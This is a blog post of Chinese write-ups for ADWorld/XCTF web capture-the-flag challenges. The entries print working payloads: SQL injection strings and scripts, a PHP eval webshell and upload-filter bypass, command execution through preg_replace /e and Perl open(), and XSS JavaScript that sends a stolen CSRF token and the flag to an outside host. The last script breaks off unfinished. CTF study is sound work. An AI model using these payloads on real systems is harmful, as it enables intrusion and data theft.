---
title: 攻防世界 ADWorld Web 部分题解（1）
tags:
  - Writeup
  - CTF
date: 2019-09-11 21:00:03
---

## 0x01 Cat 

XCTF 4th-WHCTF-2017 抓住那只猫

![](/assets/images/move/20190913225151.png)

fuzz url, 得到如下结果：

1. 127.0.0.1 / 39.156.69.79(baidu.com)，返回 ping 结果。

2. 非法 URL (特殊字符)，返回 `Invalid URL`。

3. `%80 %81 ...`，返回 Django 报错信息。

![](/assets/images/move/20190913232133.png)

在 Request information/Settings 中观察到 DATABASES 项信息为:

```bash
'default': {'ATOMIC_REQUESTS': False,
             'AUTOCOMMIT': True,
             'CONN_MAX_AGE': 0,
             'ENGINE': 'django.db.backends.sqlite3',
             'HOST': '',
             'NAME': '/opt/api/database.sqlite3',
             'OPTIONS': {},
             'PASSWORD': u'********************',
             'PORT': '',
             'TEST': {'CHARSET': None,
                      'COLLATION': None,
                      'MIRROR': None,
                      'NAME': None},
             'TIME_ZONE': None,
             'USER': ''\}\}
```
由 Django DEBUG Mode 判断出后端架构为 Python/Django，猜测PHP层的处理逻辑可能为 `cURL`。

cURL 中当 `CURL_SAFE_UPLOAD = false` 的时候，以 `@` 开头的 value 就会被当做文件上传，造成任意文件读取。当且仅当文件中存在中文字符的时候，Django 才会报错导致获取文件内容。

![](/assets/images/move/20190913232900.png)

尝试读取 `/opt/api/database.sqlite3` 数据库内容。

```bash
$ curl '111.198.29.45:32546/index.php?url=@/opt/api/database.sqlite3' | xxd | grep -A 5 -B 5 CTF
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8128    0  8128    0     0   6911      0 --:--:--  0:00:01 --:--:--  6911
00019ac0: 5c78 3030 5c78 3030 5c78 3030 5c78 3030  \x00\x00\x00\x00
00019ad0: 5c78 3030 5c78 3030 5c78 3030 5c78 3030  \x00\x00\x00\x00
00019ae0: 5c78 3030 5c78 3030 5c78 3030 5c78 3030  \x00\x00\x00\x00
00019af0: 5c78 3030 5c78 3030 5c78 3030 5c78 3030  \x00\x00\x00\x00
00019b00: 5c78 3030 5c78 3163 5c78 3031 5c78 3032  \x00\x1c\x01\x02
00019b10: 4157 4843 5446 7b79 6f6f 6f6f 5f53 7563  AWHCTF{yoooo_Suc
00019b20: 685f 415f 4730 3044 5f40 7d5c 6e26 616d  h_A_G00D_@}\n&am
00019b30: 703b 2333 393b 266c 743b 2f70 7265 2667  p;#39;&lt;/pre&g
00019b40: 743b 266c 743b 2f74 6426 6774 3b0a 2020  t;&lt;/td&gt;.  
00019b50: 2020 2020 2020 2020 2020 2020 2020 266c                &l
00019b60: 743b 2f74 7226 6774 3b0a 2020 2020 2020  t;/tr&gt;.      
100  144k    0  144k    0     0  97142      0 --:--:--  0:00:01 --:--:-- 97142
```

获取 `WHCTF{yoooo_Such_A_G00D_@}`.


## 0x02 ics-05

XCTF 4th-CyberEarth 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统

![](/assets/images/move/20190913234217.png)

在**设备维护中心**观察到 URL 如下:

```bash
http://111.198.29.45:31588/index.php?page=index
```


测试 `php://filter` 读取文件：


```bash
http://111.198.29.45:31588/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

在读取到的代码中观察到关键片段如下:

```php
<?php
if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
    echo "<br >Welcome My Admin ! <br >";
    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];
    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }
}
?>
```

在 PHP 5.5 中 preg_replace() 函数 中 $pattern 存在 `/e` 模式修正符时，会把 $replacement 当做 PHP 代码执行。

```php
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```

![](/assets/images/move/20190913235245.png)


Payload:

```php
http://111.198.29.45:31588/index.php?pat=/(.*)/e&rep=system(%27cat+s3chahahaDir/flag/flag.php%27)&sub=a
```

获取到 `cyberpeace{52ccd199b809d829873ec760128d2212}`.


## 0x03 NewsCenter

XCTF 4th-QCTF-2018

```bash
sqlmap -u "http://111.198.29.45:46407/" --forms -D news --tables -T secret_table --dump
```

获取到 `QCTF{sq1_inJec7ion_ezzz}`。


## 0x04 NaNNaNNaNNaN-Batman

tinyctf-2014

![](/assets/images/move/20190914102330.png)

修改后缀为 `.html` 打开为一个输入框，修改`eval`为`alert`获取代码。

```js
function $() {
    var e = document.getElementById("c").value;
    if (e.length == 16)
        if (e.match(/^be0f23/) != null)
            if (e.match(/233ac/) != null)
                if (e.match(/e98aa$/) != null)
                    if (e.match(/c7be9/) != null) {
                        var t = ["fl", "s_a", "i", "e}"];
                        var n = ["a", "_h0l", "n"];
                        var r = ["g{", "e", "_0"];
                        var i = ["it'", "_", "n"];
                        var s = [t, n, r, i];
                        for (var o = 0; o < 13; ++o) {
                            document.write(s[o % 4][0]);
                            s[o % 4].splice(0, 1)
                        }
                    }
}
document.write('<input id="c"><button onclick=$()>Ok</button>');
delete _
```

获取到 `flag{it's_a_h0le_in_0ne}`。


## 0x05 upload

RCTF-2015

![](/assets/images/move/20190914164359.png)

看上去是个注入题目，其实是个注入题目。在文件名处存在`insert`注入，直接进行报错或者延时注入时回显`sqlinject find`，这里可以利用**二次注入**来获取数据。

```sql
INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....),(值1, 值2,....)...
```

经 fuzz 发现过滤了 `select`、`from`、`and`等关键字，可以通过双写绕过。

```sql
'+concat((selselectect version()))+'.jpg -> 5.6
'+concat((selselectect database()))+'.jpg -> 0 题目限制:只能返回数字
```

这里可以考虑简单把要获取字符串转化为16进制后转为10进制数字带出，为避免数值太大溢出可配合 `substr()` 进行截取。

Payload:

```sql
# conv(substr(hex()))
0'+(seleselectct conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg
```

最终获得 DB: web_upload / Table: hello_flag_is_here / C: i_am_flag / flag: `!!_@m_Th.e_F!lag`。

通过fuzz发现，在进行 `insert` 操作的时候有三个列，所以构造：

```sql
文件名','uid','uid'),((database()),'uid','uid')#.jpg
```

就可以看到回显的数据，然后通过走流程就可以查询出flag。


## 0x06 PHP2

Can you anthenticate to this website?

在 `index.phps` 下获取源码如下:

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```

二次编码`admin`-> `%2561%2564%256d%2569%256e` 绕过即可，获取到 `cyberpeace{58622be0df2feba16400764dde8cfa1b}`。


## 0x07 BUG

![](/assets/images/move/20190914171606.png)

可以通过找回密码最后重置密码的时候修改用户名即可重置`admin`密码。

![](/assets/images/move/20190914172140.png)

> 同时发现 Cookie 中的 user字段为md5, format 为 **md5(UID:账号)**，md5(1:admin) 即为 admin cookie.

登录 admin 账户，修改 `X-Forwarded-For: 127.0.0.1` 即可访问 `Manage` 模块。

![](/assets/images/move/20190914172624.png)

在网页源代码中获取 Hint：

```html
<!-- index.php?module=filemanage&do=???-->
```

结合 module=filemanage 猜测 `do=upload`:

![](/assets/images/move/20190914172905.png)

fuzz 发现 upload 做了以下限制：

1. file extension

```php
php -> It is a php!
php3 -> You know what I want!
php5 -> It is not a really php file!
phtml -> You know what I want!
```

2. content-type -> `image/jpeg` 

3. php tag

```php
<?php -> Something shows it is a php!
```

`.php5` + `<script language="php"> phpinfo(); </script>` 获取到 `cyberpeace{f1ae157a8ec8212b991da36c902698f3}`。


## 0x08 web2

```php
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

function encode($str){
    $_o=strrev($str);
    // echo $_o;
        
    for($_0=0;$_0<strlen($_o);$_0++){
       
        $_c=substr($_o,$_0,1);
        $__=ord($_c)+1;
        $_c=chr($__);
        $_=$_.$_c;   
    } 
    return str_rot13(strrev(base64_encode($_)));
}

highlight_file(__FILE__);
/*
   逆向加密算法，解密$miwen就是flag
*/
?>
```

encode 流程分析:

```bash
strrev() -> ord()+1 -> base64_encode() -> strrev() -> str_rot13()
```

![](/assets/images/move/20190914180334.png)

ROT13透过与其成对的13个字母一对一置换，如HELLO变成URYYB（或者将之解码，URYYB再度变回HELLO）。ROT13是它自己本身的逆反，也就是说，要还原ROT13，套用加密同样的算法即可得，故同样的操作可用再加密与解密。

易得出 decode 流程:

```bash
rot13() -> strrev() -> base64_decode() -> ord()-1 -> strrev()
```

Payload:

```php
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
function decode($str){
    $_o=str_rot13($str);
    $_o=strrev($_o);
    $_o=base64_decode($_o);
    for($_0=0;$_0<strlen($_o);$_0++){
        $_c=substr($_o,$_0,1);
        $__=ord($_c)-1;
        $_c=chr($__);
        $_=$_.$_c;
    }
    return strrev($_);
}
echo decode($miwen);
```

获得 `flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}`。


## 0x09 wtf.sh-150

csaw-ctf-2016-quals


![](/assets/images/move/20190915141442.png)


题目环境是一个轻量级的论坛，有登录、注册、发表文章、发表评论几项功能点。

fuzz 发现 `post.wtf` 页面的 `post` 参数存在路径穿越：

![](/assets/images/move/20190915142323.png)


格式化代码：

```sh
<html>
<head>
    <link rel="stylesheet" type="text/css" href="/css/std.css" >
</head>
$ if contains 'user' ${!URL_PARAMS[@]} && file_exists "users/${URL_PARAMS['user']}"
$ then
$   local username=$(head -n 1 users/${URL_PARAMS['user']});
$   echo "<h3>${username}'s posts:</h3>";
$   echo "<ol>";
$   get_users_posts "${username}" | while read -r post; do
$       post_slug=$(awk -F/ '{print $2 "#" $3}' <<< "${post}");
$       echo "<li><a href=\"/post.wtf?post=${post_slug}\">$(nth_line 2 "${post}" | htmlentities)</a></li>";
$   done 
$   echo "</ol>";
$   if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]]
$   then
$       get_flag1
$   fi
$ fi
</html>
```

在这段代码中我们可以看到当用户 `admin` 访问他的个人页面 `profile.wtf` 时 `get_flag1` 方法将被调用:

```sh
$   if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]]
$   then
$       get_flag1
```

同时在泄露的源代码中我们观察到存在 `users` 目录，尝试路径穿越读取：

```bash
http://111.198.29.45:56854/post.wtf?post=../users/
```

![](/assets/images/move/20190915143133.png)

获取到 `admin` 用户的 SHA1 和 TOKEN: `uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==`.

修改 Cookie 中的 username 和 TOKEN 即可登录 admin 用户，在 `profile.wtf` 中获取到: `xctf{cb49256d1ab48803`.

挑战的第二部分有点复杂。 我们不得不调用`get_flag2`，但我们获取的代码不包含任何引用。

继续审计代码，在`wtf.sh`中发现一个解析和执行`.wtf`文件的函数：

```sh
max_page_include_depth=64
page_include_depth=0
function include_page {
    # include_page pathname
    local pathname=$1
    local cmd=
    [[ ${pathname(-4)} = '.wtf' ]];
    local can_execute=$;
    page_include_depth=$(($page_include_depth+1))
    if [[ $page_include_depth -lt $max_page_include_depth ]]
    then
        local line;
        while read -r line; do
            # check if we're in a script line or not ($ at the beginning implies script line)
            # also, our extension needs to be .wtf
            [[ $ = ${line01} && ${can_execute} = 0 ]];
            is_script=$;
            # execute the line.
            if [[ $is_script = 0 ]]
            then
                cmd+=$'n'${line#$};
            else
                if [[ -n $cmd ]]
                then
                    eval $cmd  log Error during execution of ${cmd};
                    cmd=
                fi
                echo $line
            fi
        done  ${pathname}
    else
        echo pMax include depth exceeded!p
    fi
}
```

如果我们能够上传自己构造的 `.wtf` 文件的话，即可 GETShell，继续审计代码，在 `post_functions.sh` 中留意到`replay`函数：

```sh
function reply {
    local post_id=$1;
    local username=$2;
    local text=$3;
    local hashed=$(hash_username "${username}");
    curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
    next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
    next_file=(posts/${post_id}/${next_reply_id});
    echo "${username}" > "${next_file}";
    echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
    echo "${text}" >> "${next_file}";
    # add post this is in reply to to posts cache
    echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";
}
```

当我们回复帖子时通过GET方法提交了一个 `post` 参数，此参数也存在着**目录穿越**漏洞，我们可以通过这里自定义上传文件的文件名从而写入`.wtf`。 该函数还在文件的第一行写了用户名。 因此，如果我们只是注册了一个包含有效shell命令的用户名，并将其写入`.wtf`后缀文件到我们可以访问该文件的目录中，即可达成RCE。幸运的是，`users_lookup`文件没有包含`.noread`文件，因此我们可以将`.wtf文`件写入`users_lookup`目录下。

应用程序允许注册包含特殊字符的用户，例如`$`，但是包含空格的用户名是不被允许的。 但是，因为 bash 允许执行没有空格的命令(e.g. {cat,/etc/passwd})，所以我们可以通过注册 `${find,/,-iname,get_flag2}` 用户并使用以下请求创建了回复即可获取 flag2.

```sh
POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1
Host: 111.198.29.45:48634
Content-Type: application/x-www-form-urlencoded
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==

text=asd&submit=
```

这里`%09`为水平制表符，用于在`reply`函数中达成绕过从而作为文件写入而非目录，获取到响应如下。

```sh
GET /users_lookup/sh.wtf HTTP/1.1
Host: 111.198.29.45:48634
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==

HTTP/1.1 200 OK
[...]
/usr/bin/get_flag2
RE:
asd
```

由此 `get_flag2` 是 `/usr/bin/` 下的一个二进制文件。我们现在只需要创建用户`$/usr/bin/get_flag2` 并再次发送回复请求即可：

![](/assets/images/move/20190915152339.png)

![](/assets/images/move/20190915152358.png)

获取到 `149e5ec49d3c29ca}`=> `xctf{cb49256d1ab48803149e5ec49d3c29ca}`.

## 0x0A i-got-id-200

csaw-ctf-2016-quals

Wtf... I literally just setup this website and it's already popped...

这个挑战非常有趣，主要考点在于[Blackhat Asia 2016](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf)上所讲述的 **Perl 5 Vulnerable**。

![](/assets/images/move/20190916165926.png)

题目环境非常简单，我们把目光锁定在 `file.pl`，此页面允许我们上传任意后缀的文件，然后打印所上传的文件内容：

![](/assets/images/move/20190916170051.png)

根据此页面的功能，我们猜测后端代码可能如下：

```perl
use strict;
use warnings;
use CGI;
 
my $cgi= CGI->new;
if ( $cgi->upload( 'file' ) )
{
my $file= $cgi->param( 'file' );
while ( <$file> ) { print "$_"; } }
```

所以问题出在哪里呢？关注如下代码：

```perl
my $file= $cgi->param( 'file' )
```

`param()`函数返回一个**包含所有参数值的列表**，但**只插入第一个值到**`$file`，紧接着：

```perl
while ( <$file>)
```

[`<>`](https://perlmaven.com/the-diamond-operator) 被称作**钻石运算符**（Diamond operator），它允许我们迭代命令行上给出的所有文件中的行。

![](/assets/images/move/20190916172745.png)

`<>`不适用于 strings 除非此字符串为命令行参数"`ARGV`"，它将遍历每个 ARG 值并作为参数传递给 `open()` 调用。

**=>我们可以通过指定 `$file` 标量值来代替上传文件描述符，从而达成任意文件读取。**

![](/assets/images/move/20190916174047.png)

下面我们有两种方式可以获取到 flag.

**1.简单幸运的方法**：`猜`

flag 就位于 `/flag`：

![](/assets/images/move/20190916174306.png)


**2.“黑客”的方式：**`RCE`

Perl 中的 `open()` 函数同样可以用于执行代码，因为它之前被用来打开**管道**（pipes），我们可以使用 `|` 作为分隔符，因为 Perl 识别到 `|` 表示 `open()` 正在打开一个管道。 攻击者可以劫持 `open()` 调用，通过添加 `|` 来执行命令。



Payload:

```sh
# 空格 %20 urlenode传输
# ${IFS} Internal Field Seprator 内部域分隔符
/bin/bash%20-c%20ls${IFS}/|
/bin/bash%20-c%20cat${IFS}/flag|
```

![](/assets/images/move/20190916175607.png)


## 0X0B ics-07

XCTF 4th-CyberEarth 工控云管理系统项目管理页面解析漏洞

![](/assets/images/move/20190916180246.png)

在管理页面发现`/view-source.php`可以获取源代码，三段 PHP 代码分别如下：

```php
<?php
session_start();
if (!isset($_GET[page])) {
  show_source(__FILE__);
  die();
}
if (isset($_GET[page]) && $_GET[page] != 'index.php') {
  include('flag.php');
} else {
  header('Location: ?page=flag.php');
}
?>
```

从这段代码中了解到 flag 位于 `flag.php`，可以通过设置 `page=flag.php` 来包含 flag.php.

```php
<?php
if ($_SESSION['admin']) {
    $con = $_POST['con'];
    $file = $_POST['file'];
    $filename = "backup/".$file;
    if (preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)) {
        die("Bad file extension");
    } else {
        chdir('uploaded');
        $f = fopen($filename, 'w');
        fwrite($f, $con);
        fclose($f);
    }
}
?>
```

这段代码的功能是通过 POST 的方法上传文件，由 `con` 指定文件内容、`file` 指定文件名，通过正则匹配文件名后缀过滤了以下后缀（不区分大小写）：

```php
php php3 php4 php5 php7 pht phtml
```

如何突破文件后缀名的限制? 主要思路有如下三点：

1. Web中间件的解析漏洞 , 因为已经知道中间件是`Apache2` , 使用的是`PHP` . 所以无非就是`Apache`解析漏洞或者`PHP CGI`解析漏洞

2. 通过上传`.htaccess`文件 , 该文件是`Apache`的一大特色 . 其中一个功能便是修改不同`MIME`类型文件使用的解析器 . 但要使用该功能需要`Apache`在配置文件中设置`AllowOverride All` , 并且启用`Rewrite`模块 , eg:

```xml
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
# 此时, shell.jpg 会被解析为PHP文件
```

3. 特殊文件后缀, 想要解析PHP文件, 并非后缀要是*.php. 如果查看mime.types, 会发现很多文件后缀都使用了 `application/x-httpd-php` 这个解析器：

![](/assets/images/move/20190916184358.png)

其中 `phps` 和 `php3p` 都是源代码文件, 无法被执行. 而剩下所有的后缀都被正则表过滤, 所以这种方式无法成功上传可执行文件.

所以最后还是回到了**中间件解析漏洞**上 , 但是经过测试发现并不是常规的解析漏洞 , 而是利用了一个**Linux的目录结构特性**, 如下:

```sh
~ $ mkdir 1.php
~ $ mkdir ~/1.php/2.php/
~ $ cd ~/1.php/2.php/..
~/1.php $ ls -la
drwxr-xr-x  3 .
drwxr-xr-x 21 ..
drwxr-xr-x  2 2.php
```
创建了一个目录为 1.php, 在 1.php 下创建了一个子目录为 2.php. Linux 下每创建一个新目录 , 都会在其中自动创建两个隐藏文件：`.` 和 `..`。

其中 `.` 代表当前目录 ，`..` 代表当前目录的父目录 , 访问 `./1.php/2.php/..` 代表访问 2.php 的父目录 , 也就是访问 `1.php`. 这里上传 Shell 可以用这个特性来 bypass，Payload如下：

```
con=<?php @eval($_POST[0]);?>&file=shell.php/.
```

如果获取到 `$_SESSION['admin']` 则可以通过此功能上传 Webshell，让我们来看一下第三段代码：

```php
<?php
if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
    include 'config.php';
    $id = mysql_real_escape_string($_GET[id]);
    $sql="select * from cetc007.user where id='$id'";
    $result = mysql_query($sql);
    $result = mysql_fetch_object($result);
} else {
    $result = False;
    die();
}
if(!$result) die("<br >something wae wrong ! <br>");
if($result){
    echo "id: ".$result->id."</br>";
    echo "name:".$result->user."</br>";
    $_SESSION['admin'] = True;
}
?>
```

从URL获取一个id参数 , 这个id参数要满足不为 '1', 且最后一位为 '9'. 当通过这个判断后, 将其带入数据库操作, 如果返回的结果不为空, 那么将会设置 `$_SESSION['admin'] = True`. 第一反应是 SQLi，虽然使用 `mysql_real_escape_string()` 转义了SQL语句中的特殊字符，如果目标站点使用 GBK 编码，则可能可以通过宽字节注入来绕过。

![](/assets/images/move/20190916190329.png)

留意到`floatval()`函数, floatval() 函数用于获取变量的浮点值, 返回浮点值则这里的`floatval($_GET[id]) !== '1'`永真，且floatval()在碰到特殊字符时会**截断**后面的部分(如空格等)，则设置 `id=1%209`即可查询到 `id=1` 的 admin。

![](/assets/images/move/20190916195254.png)

![](/assets/images/move/20190916195354.png)

![](/assets/images/move/20190916195540.png)


## 0x0C lottery

XCTF 4th-QCTF-2018

People are winning fabulous prizes every day. You could win up to $5000000!

- PHP弱类型比较

- GitHack

首先访问`robots.txt`/`.git`返现 Git 仓库可使用 GitHack 拿到源码。

问题出现在 `api.php` 的 `buy()`:

```php
function buy($req){
	require_registered();
	require_min_money(2);

	$money = $_SESSION['money'];
	$numbers = $req['numbers'];
    $win_numbers = random_win_nums();
    for($i=0; $i<7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
    [...]
}
```

`$numbers` 来自用户输入：

```json
{"action":"buy","numbers":"1111111"}
```

与 `$win_numbers` 进行比较，未进行数据类型检验与过滤，由于 for 循环内进行的是 `==` PHP 弱类型比较，我们可以构造出如下 payload:

```json
{"action":"buy","numbers":[true, true, true, true, true, true, true]}
```

进行重放 获取足够的 $ 购买 flag 即可：

![](/assets/images/move/20190925220150.png)

获取到 flag 如下:

```json
{"status":"ok","msg":"Here is your flag: cyberpeace{d1614926fe8edc22fc054ef0c7562504}","money":410310}
```

## 0x0D Zhuanxv

XCTF 4th-SCTF-2018 你只是在扫描目标端口的时候发现了一个开放的web服务

![](/assets/images/move/20191002095046.png)

在 Github 上搜索到[相关项目](https://github.com/Lazyboxx/zhuanxvapplication)，后台路由为 `/zhuanxvlogin`：

![](/assets/images/move/20191002095404.png)

通过 Burp 抓包获取到如下图片读取接口：

![](/assets/images/move/20191002095633.png)

猜测为 Java 编写，尝试读取配置文件 `../../WEB-INF/web.xml` ：

![](/assets/images/move/20191002095836.png)

发现为 Struct2 框架，获取 class 文件路径：

![](/assets/images/move/20191002101308.png)

同时在 `user.hbm.xml` 获取到 flag 存储的表名和列名：

![](/assets/images/move/20191002103011.png)

- UserServiceImpl.class

```java
/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl.class
```
通过 `JD-GUI` 即可反编译 `.class` 文件获取源码：

![](/assets/images/move/20191002102245.png)

```java
public class UserServiceImpl implements UserService {
  private UserDao userDao;
  public UserDao gerUserDao() { return this.userDao; }
  public void setUserDao(UserDao userDao) { this.userDao = userDao; }
  public List<User> findUserByName(String name) { return this.userDao.findUserByName(name); }
  
  public List<User> loginCheck(String name, String password) {
    name = name.replaceAll(" ", "");
    name = name.replaceAll("=", "");
    Matcher username_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(name);
    Matcher password_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(password);
    if (password_matcher.find()) {
      return this.userDao.loginCheck(name, password);
    }
    return null;
  }
}
```

HQL 过滤了空格和等号，可用换行符号 `%0a` 代替。

- UserDaoImpl.class

```java
/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/dao/impl/UserDaoImpl.class
```

```java
public class UserDaoImpl extends HibernateDaoSupport implements UserDao {
  public List<User> findUserByName(String name) { 
      return getHibernateTemplate().find("from User where name ='" + name + "'"); 
    }
  public List<User> loginCheck(String name, String password) { 
      return getHibernateTemplate().find("from User where name ='" + name + "' and password = '" + password + "'"); 
    }
}
```

构造 payload ，获取 admin 权限：

```java
/zhuanxvlogin?user.name=admin%27%0Aor%0A%271%27%3E%270'%0Aor%0Aname%0Alike%0A'admin&user.password=1
```

构造 exp 如下，通过盲注获取flag：

```python
import requests
r = requests.session()
flag = ''
for i in range(1,50):
    p = ''
    for j in range(1, 255):
        payload = "(select%0Aascii(substr(id,"+str(i)+",1))%0Afrom%0AFlag%0Awhere%0Aid<2)<'"+str(j)+"'"
        url="http://111.198.29.45:49524/zhuanxvlogin?user.name=admin'%0Aor%0A"+payload+"%0Aor%0Aname%0Alike%0A'admin&user.password=1"
        r1 = r.get(url)
        if len(r1.text) > 20000 and p != '':
            flag += p
            print i, flag
            break
        p = chr(j)
```

获取到 sctf{C46E250926A2DFFD831975396222B08E}。

- *`Spring` 框架下常用的配置文件:

```java
/WEB-INF/classes/Struts.xml
/WEB-INF/web.xml

/WEB-INF/classes/applicationContext.xml     
    1. 存有jdbc数据库账号密码  
        <property name="username" value="root"/>

    2. 数据库类型,表名,位置 
        <property name="mappingLocations">
            <value>user.hbm.xml</value>
            ...

    3. 得知类名
            <bean id="userService" class="com.cuitctf.service.impl.UserServiceImpl">
            <property name="userDao">
              <ref bean="userDAO"/>
            ...
```

## 0x0E Website

[HITB CTF Singapore 2017] Web 434 – Website

![](/assets/images/move/20191002155816.png)

存在多处 XSS，waf 不严格。思路：提交链接 -> admin check -> admin(&csrftoken) get flag. 

```bash
恶意链接 -> 302 jsonp xss -> 提取csrftoken -> xhr 控制读取 flag -> 接收 flag
```

提交链接 `http://endl.me/xss`:

- index.php

```php
<?php 
header("Location:http://111.198.29.45:59794/action.php?callback=<script src=\"//endl.me/xss/website.js\"></script>");
?>
```

- website.js

```js
html = document.head.innerHTML;
function request(url)
{
    img = document.createElement("img");
    img.width = "1px";
    img.height = "1px";
    img.src = url;
    document.body.appendChild(img);
}
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
function myfunc()
{
    html = document.body.innerHTML;
    i = html.indexOf("token");
    j = html.indexOf("','erro");
    token = html.slice(i+8,j);
    request(domain+btoa(token));
    flag = httpGet("http://111.198.29.45:47495/getflag.php?csrftoken="+token);
    request(domain+btoa(flag));
}
domain = "http://endl.me/";
setTimeout(myfunc, 2000);
```

获取到 HITB{j50nP_1s_VulN3r4bLe}.

另一种解法，在 fuzz 中发现一个有趣的路由如下：

```php
/action.php?callback=getInfo
```

callback 参数可控，payload如下：

```js
/action.php?callback=%3Chtml%3E%3Cbody%3E%00%00%00%00%00%00%00%3Cscript%20src=%22//cdn.bootcss.com/jquery/3.1.1/jquery.min.js%22%3E%3C/script%3E%00%00%00%00%00%00%00%3Cscript%20src=%22//endl.me/xss/test.js%22%3E%3C/script%3E%3Cdiv%3E
```

- test.js

```js
window.onload = function () {
    var a = document.getElementsByTagName('div')[0],
        data = eval(a.innerHTML);
    $.get("getflag.php", {
        csrftoken: data['csrftoken']
        }, function (data, status) {
        feedback(data);
    });
}

function feedback(data) {
    var data = encodeURIComponent(data),
        img = document.createElement('img');
    img.src = 'https://endl.me/xss/?`' + data;
    console.log(img);
    document.body.appendChild(img);
}
```
![](/assets/images/move/20191005112856.png)

## 0x10 ics-02

XCTF 4th-CyberEarth 工控云管理系统的文档中心页面，存在不易被发现的漏洞。

- SSRF + INSERT SQLi

通过 `download.php?dl=` 处 dl 参数进行 SSRF 攻击 `/secret/secret_debug.php` 进行 SQLi 获取 flag。

MYSQL Demo:

```sql
mysql> create table ics02(A VARCHAR(255) NOT NULL UNIQUE, B VARCHAR(255) NOT NULL, C VARCHAR(255) NOT NULL, D VARCHAR(255) NOT NULL);
Query OK, 0 rows affected (0.05 sec)

mysql> DESC ics02;
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| A     | varchar(255) | NO   | PRI | NULL    |       |
| B     | varchar(255) | NO   |     | NULL    |       |
| C     | varchar(255) | NO   |     | NULL    |       |
| D     | varchar(255) | NO   |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
4 rows in set (0.00 sec)

mysql> INSERT INTO ics02 (A,B,C,D) VALUES ('a','b','c','d');
Query OK, 1 row affected (0.01 sec)

mysql> select * from ics02;
+---+---+---+---+
| A | B | C | D |
+---+---+---+---+
| a | b | c | d |
+---+---+---+---+
1 row in set (0.00 sec)

mysql> INSERT INTO ics02 (A,B,C,D) VALUES ('q',version()/*,'b'*/,'c','d');
Query OK, 1 row affected (0.00 sec)

mysql> select * from ics02;
+---+--------+---+---+
| A | B      | C | D |
+---+--------+---+---+
| a | b      | c | d |
| q | 8.0.17 | c | d |
+---+--------+---+---+
2 rows in set (0.00 sec)
```

Payload:

```python
import random
import requests
from urllib import urlencode

# url SSRF attack secret_debug.php IP: 127.0.0.1
url = "http://127.0.0.1/secret/secret_debug.php?"

# Payload
# payload = "version()" 
# 5.5.62-0ubuntu0.14.04.1
# payload = "database()" 
# ssrfw
# payload = "SELECT(GROUP_CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema)='ssrfw'"
# cetcYssrf,users,
# payload = "SELECT(GROUP_CONCAT(column_name))FROM(information_schema.columns)WHERE(table_name)='cetcYssrf'"
# secretName,value,
payload = "SELECT(GROUP_CONCAT(secretName,0x3a,value))FROM(ssrfw.cetcYssrf)"
# flag:flag{cpg9ssnu_OOOOe333eetc_2018}

# Duplicate entry '12' for key 'licenceNumber'
# make sure Indetification Number different 
randstr = random.getrandbits(16)

# GET params
data = (url + urlencode({
            "s":"3",
            "txtfirst_name": "A','B',(" + payload + "),'D'/*",
            "txtmiddle_name": "B",
            "txtname_suffix": "C",
            "txtLast_name": "D",
            'txtdob': "*/,'E",
            'txtdl_nmbr': randstr,
            'txtRetypeDL': randstr,
            'btnContinue2': "Continue"
            })
